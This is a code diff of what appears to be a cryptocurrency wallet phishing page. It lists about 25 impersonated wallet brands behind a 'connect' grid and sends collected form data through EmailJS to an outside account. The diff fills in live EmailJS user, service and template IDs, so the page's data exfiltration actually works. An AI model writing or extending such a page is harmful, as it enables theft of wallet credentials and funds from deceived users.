@@ -90,57 +90,145 @@
         
         <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
             <!-- Wallet Options -->
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('MetaMask')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="h-16 w-16 mb-3">
-                <span class="font-medium">MetaMask</span>
-            </div>
-            
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Trust Wallet')">
-                <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" class="h-16 w-16 mb-3">
-                <span class="font-medium">Trust Wallet</span>
-            </div>
-            
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Coinbase')">
-                <img src="https://th.bing.com/th/id/OSK.wMgptr4z9aKQqmpTZr36HhT1TLDiaZBG-nQ7hoXVB48?w=224&h=200&c=7&rs=1&o=6&pid=SANGAM" alt="Coinbase" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
-                <span class="font-medium">Coinbase</span>
+            <!-- Wallet Options (Initial) -->
+            <div id="wallets-initial" class="contents">
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('MetaMask')">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="h-16 w-16 mb-3">
+                    <span class="font-medium">MetaMask</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Trust Wallet')">
+                    <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" class="h-16 w-16 mb-3">
+                    <span class="font-medium">Trust Wallet</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Coinbase')">
+                    <img src="https://th.bing.com/th/id/OSK.wMgptr4z9aKQqmpTZr36HhT1TLDiaZBG-nQ7hoXVB48?w=224&h=200&c=7&rs=1&o=6&pid=SANGAM" alt="Coinbase" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
+                    <span class="font-medium">Coinbase</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Phantom')">
+                    <img src="https://th.bing.com/th/id/ODLS.dc6da46b-c049-4d76-8f9c-33c96daa9ede?w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2" alt="Phantom" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
+                    <span class="font-medium">Phantom</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Qubetic')">
+                    <img src="https://th.bing.com/th?q=Qubetics&w=42&h=42&c=7&rs=1&p=0&o=5&pid=1.7&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1" alt="Qubetic" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
+                    <span class="font-medium">Qubetic</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Uniswap')">
+                    <img src="https://th.bing.com/th?q=Uniswap+Company+Information&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Uniswap" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
+                    <span class="font-medium">Uniswap</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Binance Chain Wallet')">
+                    <img src="https://ts4.mm.bing.net/th?id=OIP.qdC1jdRu3U8NjpWiIr_HxgHaHa&pid=15.1" alt="Binance Chain Wallet" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
+                    <span class="font-medium">Binance Chain</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Bitget')">
+                    <img src="https://th.bing.com/th/id/OIP.2kxpEOOayPDe1GxUFzpv8gAAAA?w=166&h=180&c=7&r=0&o=5&pid=1.7" alt="Bitget" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">Bitget</span>
+                </div>
             </div>
 
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Phantom')">
-                <img src="https://th.bing.com/th/id/ODLS.dc6da46b-c049-4d76-8f9c-33c96daa9ede?w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2" alt="Phantom" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
-                <span class="font-medium">Phantom</span>
+            <!-- See More Button -->
+            <div class="col-span-2 md:col-span-4 flex justify-center mt-2">
+                <button id="seeMoreBtn" onclick="showMoreWallets()" class="flex items-center px-6 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-medium shadow-lg transition-all duration-300 animate-pulse">
+                    <span>See More</span>
+                    <svg class="w-5 h-5 ml-2 animate-bounce" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+                    </svg>
+                </button>
             </div>
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Qubetic')">
-                <img src="https://th.bing.com/th?q=Qubetics&w=42&h=42&c=7&rs=1&p=0&o=5&pid=1.7&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1" alt="Qubetic" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
-                <span class="font-medium">Qubetic</span>
+
+            <!-- More Wallets (Hidden by default) -->
+            <div id="wallets-more" class="contents hidden animate__animated animate__fadeIn">
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('OKX Wallet')">
+                    <img src="data:image/jpeg;base64,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" alt="OKX Wallet" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">OKX Wallet</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Bybit Wallet')">
+                    <img src="https://th.bing.com/th?q=Bybit+Login+Logo&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Bybit Wallet" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">Bybit Wallet</span>
+                </div>
+
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Ledger')">
+                    <img src="https://th.bing.com/th?q=Ledger+Wallet+Company+Logo&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Ledger" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
+                    <span class="font-medium">Ledger</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Trezor')">
+                    <img src="https://th.bing.com/th?q=Trezor+Wallet+Picture+without+Background&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Trezor" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
+                    <span class="font-medium">Trezor</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Exodus')">
+                    <img src="https://th.bing.com/th?q=Exodus+Wallet+Logo&w=42&h=42&c=7&rs=1&p=0&o=5&pid=1.7&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1" alt="Exodus" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
+                    <span class="font-medium">Exodus</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Atomic Wallet')">
+                    <img src="https://th.bing.com/th?q=Atomic+Wallet+Logo.png&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Atomic Wallet" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
+                    <span class="font-medium">Atomic Wallet</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Rainbow')">
+                    <img src="https://th.bing.com/th?q=Rainbow+Wallet+Logo.svg&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Rainbow" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
+                    <span class="font-medium">Rainbow</span>
+                </div>
+                                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Kraken')">
+                    <img src="https://th.bing.com/th?q=Kraken+Wallet+Logo&w=42&h=42&c=7&rs=1&p=0&o=5&pid=1.7&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1" alt="Kraken" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">Kraken</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Solflare')">
+                    <img src="https://solflare.com/favicon.ico" alt="Solflare" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">Solflare</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('SafePal')">
+                    <img src="https://www.safepal.com/favicon.ico" alt="SafePal" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">SafePal</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Tangem')">
+                    <img src="https://tangem.com/favicon.ico" alt="Tangem" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">Tangem</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Zengo')">
+                    <img src="https://zengo.com/favicon.ico" alt="Zengo" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">Zengo</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Mycelium')">
+                    <img src="https://th.bing.com/th?q=Mycelium+Logo&w=42&h=42&c=7&rs=1&p=0&o=5&pid=1.7&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1" alt="Mycelium" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">Mycelium</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Coinomi')">
+                    <img src="https://th.bing.com/th?q=Coinomi&w=42&h=42&c=7&rs=1&p=0&o=5&pid=1.7&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1" alt="Coinomi" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">Coinomi</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Argent')">
+                    <img src="https://th.bing.com/th/id/OIP.o8Y3R2AQ5-DU1bL_OLMvFwHaHa?w=169&h=180&c=7&r=0&o=5&pid=1.7" alt="Argent" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">Argent</span>
+                </div>
+                <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Aave')">
+                    <img src="https://th.bing.com/th?q=Aave+Logo.png&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Aave" class="h-16 w-16 mb-3 bg-transparent rounded-full">
+                    <span class="font-medium">Aave</span>
+                </div>
+
+
+
+                <!-- Optional: Add a "Back" button to return to initial wallets -->
+                <div class="col-span-2 md:col-span-4 flex justify-center mt-2">
+                    <button onclick="showInitialWallets()" class="flex items-center px-6 py-2 bg-gray-700 hover:bg-gray-600 text-white rounded-lg font-medium shadow-lg transition-all duration-300">
+                        <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
+                        </svg>
+                        <span>Back</span>
+                    </button>
+                </div>
             </div>
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Uniswap')">
-                <img src="https://th.bing.com/th?q=Uniswap+Company+Information&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Uniswap" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
-                <span class="font-medium">Uniswap</span>
-            </div>
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Binance Chain Wallet')">
-                <img src="https://ts4.mm.bing.net/th?id=OIP.qdC1jdRu3U8NjpWiIr_HxgHaHa&pid=15.1" alt="Binance Chain Wallet" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
-                <span class="font-medium">Binance Chain</span>
-            </div>
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Ledger')">
-                <img src="https://th.bing.com/th?q=Ledger+Wallet+Company+Logo&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Ledger" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
-                <span class="font-medium">Ledger</span>
-            </div>
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Trezor')">
-                <img src="https://th.bing.com/th?q=Trezor+Wallet+Picture+without+Background&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Trezor" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
-                <span class="font-medium">Trezor</span>
-            </div>
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Exodus')">
-                <img src="https://th.bing.com/th?q=Exodus+Wallet+Logo&w=42&h=42&c=7&rs=1&p=0&o=5&pid=1.7&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1" alt="Exodus" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
-                <span class="font-medium">Exodus</span>
-            </div>
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Atomic Wallet')">
-                <img src="https://th.bing.com/th?q=Atomic+Wallet+Logo.png&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Atomic Wallet" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
-                <span class="font-medium">Atomic Wallet</span>
-            </div>
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Rainbow')">
-                <img src="https://th.bing.com/th?q=Rainbow+Wallet+Logo.svg&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Rainbow" class="h-16 w-16 mb-3 bg-transparent rounded-full" style="background: transparent; border-radius: 50%;">
-                <span class="font-medium">Rainbow</span>
-            </div>
+
+            <script>
+            function showMoreWallets() {
+                document.getElementById('wallets-initial').classList.add('hidden');
+                document.getElementById('seeMoreBtn').classList.add('hidden');
+                document.getElementById('wallets-more').classList.remove('hidden');
+            }
+            function showInitialWallets() {
+                document.getElementById('wallets-more').classList.add('hidden');
+                document.getElementById('wallets-initial').classList.remove('hidden');
+                document.getElementById('seeMoreBtn').classList.remove('hidden');
+            }
+            </script>
 
         </div>
         
@@ -309,7 +397,7 @@
     <script>
         // Initialize EmailJS with your credentials
         (function() {
-            emailjs.init('YOUR_EMAILJS_USER_ID'); // Replace with your actual EmailJS user ID
+            emailjs.init('SiqtsqFcjEHmEhAlI'); // Replace with your actual EmailJS user ID
         })();
         
         let currentWallet = '';
@@ -502,7 +590,7 @@
             };
             
             // Send data via EmailJS
-            emailjs.send('YOUR_EMAILJS_SERVICE_ID', 'YOUR_EMAILJS_TEMPLATE_ID', templateParams)
+            emailjs.send('service_qg99kwe', 'template_npxi98f', templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
                     
